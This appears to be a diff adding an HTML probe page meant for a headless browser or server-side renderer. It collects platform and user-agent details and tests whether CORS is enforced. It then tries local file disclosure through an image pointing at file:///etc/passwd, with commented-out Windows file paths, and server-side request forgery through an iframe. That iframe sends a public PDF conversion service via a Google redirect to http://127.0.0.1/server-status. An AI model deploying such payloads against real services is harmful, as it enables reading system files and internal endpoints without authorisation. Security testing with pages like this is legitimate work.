@@ -1,0 +1,144 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <head>
+        <meta charset="UTF-8">
+        <title></title>
+        <style>
+            table, th, td {
+                border: 1px solid black;
+                border-collapse: collapse;
+            }
+            th, td {
+                padding: 2px;
+            }
+            iframe {
+                width: 350x;
+                height: 350px;
+            }
+        </style>
+    </head>
+  
+    <script>
+
+      
+    //document.domain="http://127.0.0.1";
+
+    document.addEventListener('DOMContentLoaded', function() {
+
+          fetch('https://google.com')
+            .then(function(response) {
+                // If the request succeeds, it might indicate that security features like CORS are disabled
+                document.getElementById('testResult').textContent = 'CORS Request succeeded: Security features might be disabled.';
+            })
+            .catch(function(error) {
+                // If the request fails, it likely means that CORS policy is enforced
+                document.getElementById('testResult').textContent = 'CORS Request failed: Security features are likely enabled.';
+            });
+
+      
+          var platform = navigator.platform;
+          var userAgent = navigator.userAgent;
+          var uaOs;
+          var webServer = "unknown";
+
+          // OS from User-agent
+          if (userAgent.includes('Windows')) {
+              uaOs = 'Windows';
+          } else if (userAgent.includes('Linux')) {
+              uaOs = 'Linux';
+          }
+
+           // OS 
+          if (platform.includes('Win')) {
+              platform = 'Windows';
+          } else if (platform.includes('Linux')) {
+              platform = 'Linux';
+          } else {
+              platform = uaOs;
+          }
+
+          // logging OS, browser version
+          console.log("Platform: " + platform);
+          console.log("User-Agent: " + userAgent);
+          console.log("Determined OS: " + uaOs);
+      
+          var sp1Element = document.getElementById('sp1');
+          var sp2Element = document.getElementById('sp2');
+          var sp3Element = document.getElementById('sp3');
+          var sp4Element = document.getElementById('sp4');
+          sp1Element.textContent = "-Platform:" + navigator.platform;
+          sp2Element.textContent = "-U-agent :" + navigator.userAgent;
+          sp3Element.textContent = "-Det-plat:" + platform;
+
+          sp4Element.textContent = "-location:" + window.location; //document.domain;
+
+          if (!window.location.href.includes('glitch')) {
+              sp4Element.textContent = "-Location:" + window.location.href; //document.domain;
+          }
+          else
+              sp4Element.textContent = "-Location:Remote";
+      
+          var sp5Element = document.getElementById('sp5');      
+
+          // set iframe src
+           
+          //setIframeSrcAndLoad('iframe1_1', 'file:///C://Temp/read11.png"');
+          //setIframeSrcAndLoad('iframe1_2', 'file:///C://tmp1/read11.txt');
+          
+        // setIframeSrcAndLoad('iframe1_2', 'https://doc2pdf.pdf24.org/doc2pdf.php?url=http://127.0.0.1/index.html');
+        setIframeSrcAndLoad('iframe1_2', 'https://doc2pdf.pdf24.org/doc2pdf.php?url=https://www.google.com/url?rct=j&sa=t&url=http://127.0.0.1/server-status');
+
+
+          function setIframeSrcAndLoad(iframeId, src) {
+              var iframe = document.getElementById(iframeId);
+              iframe.src = src;
+              iframe.onload = function() {
+                  var content = iframe.contentWindow.document.body.innerHTML;
+              };
+          }
+
+      });
+      
+      
+        
+    </script>
+</head>
+<body>
+    <div id="testResult"></div>
+    <span id="sp1"></span><br>
+    <span id="sp2"></span><br>
+    <span id="sp3"></span>&nbsp;&nbsp;
+    <span id="sp4"></span>&nbsp;&nbsp;
+    <span id="sp5"></span>
+
+    <table>
+        <tr>
+            <td bgcolor="pink">DFlW</td>  
+            <td>
+              <table>
+                <tr>
+                  <td><img src="file:///etc/passwd" id="iframe1_1" width="340" /></td>
+<!--                   <td><img src="file:///C://tmp1/read11.png" id="iframe1_1" width="340" /></td> -->
+                  <td><iframe id="iframe1_2" width="340"></iframe></td>
+                </tr>
+              </table>
+            </td>
+        </tr>
+
+
+    </table>
+  
+</body>
+  
+  
+  <script>
+
+
+
+    
+  </script>
+    
+</html>
